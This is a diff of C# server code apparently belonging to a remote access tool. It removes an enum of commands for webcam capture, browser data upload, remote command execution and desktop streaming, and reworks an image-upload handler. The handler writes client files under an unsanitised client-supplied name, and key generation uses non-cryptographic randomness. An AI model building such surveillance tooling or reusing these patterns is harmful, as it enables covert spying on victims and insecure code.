@@ -15,49 +15,18 @@ using System.Web.Helpers;
 
 namespace Server.Classes
 {
-    public enum Command
-    {
-        UPLOAD_IMAGE,
-        UPLOAD_SENTENCES,
-        UPLOAD_WEBCAM_IMAGE,
-        EXECUTE_COMMAND,
-        UPLOAD_PORT_INFO,
-        UPLOAD_BROWSER_DATA,
-        DOWNLOAD_FILE,
-        UPLOAD_FILE_EVENTS,
-        STREAM_DESKTOP,
-        STOP_STREAM_DESKTOP,
-        MOVE_CURSOR,
-        DO_NOTHING
-    }
-
     public class RhsApi
     {
-        public class Keys
-        {
-            public string Public { get; set; }
-            public string Private { get; set; }
-        }
-
-
-        private static string publicKey;
-        private static string privateKey;
-        private static string dateformat = "MMM ddd d HH:mm:ss yyyy";// "Y-m-d H:i:s";
-
-        private static string SHA1(string str)
-        {
-            using (SHA1Managed sha1 = new SHA1Managed())
-            {
-                return Encoding.UTF8.GetString(sha1.ComputeHash(Encoding.UTF8.GetBytes(str)));
-            }
-        }
+        //private static string publicKey;
+        //private static string privateKey;
+        private static readonly string dateformat = "MMM ddd d HH:mm:ss yyyy";// "Y-m-d H:i:s";
 
         public static Keys Generate()
         {
             return new Keys()
             {
-                Public = SHA1(RhsApi.mt_rand_str(40)),
-                Private = SHA1(RhsApi.mt_rand_str(40))
+                Public = Security.SHA1(Security.mt_rand_str(40)),
+                Private = Security.SHA1(Security.mt_rand_str(40))
             };
         }
 
@@ -187,16 +156,14 @@ namespace Server.Classes
             return GetDateTime(GetTime());
         }
 
-        public static string UploadImage(string data)
+        public static string UploadImage(ImageData data)
         {
             try
             {
-
-                var name = "latest.jpg";// "image_" + DateTime.Now.Ticks + ".jpg";
-                var file = GetFile("~/DataFromClient/", name);
-                var content = Convert.FromBase64String(data);
+                var file = GetFile("~/DataFromClient/", data.FileName);
+                var content = Convert.FromBase64String(data.Image);
                 File.WriteAllBytes(file, content);
-                if (data.Length > 0)
+                if (data.Image.Length > 0)
                 {
                     return file;
                 }
@@ -300,16 +267,6 @@ namespace Server.Classes
         {
             //header('content-type: application/json; charset=utf-8');
             return Json.Encode(data);
-        }
-
-        private static string mt_rand_str(int amount, string chars = "abcdefghijklmnopqrstuvwxyz1234567890")
-        {
-            var random = new Random();
-            var result = new string(
-                Enumerable.Repeat(chars, amount)
-                          .Select(s => s[random.Next(s.Length)])
-                          .ToArray());
-            return result;
         }
     }
 }
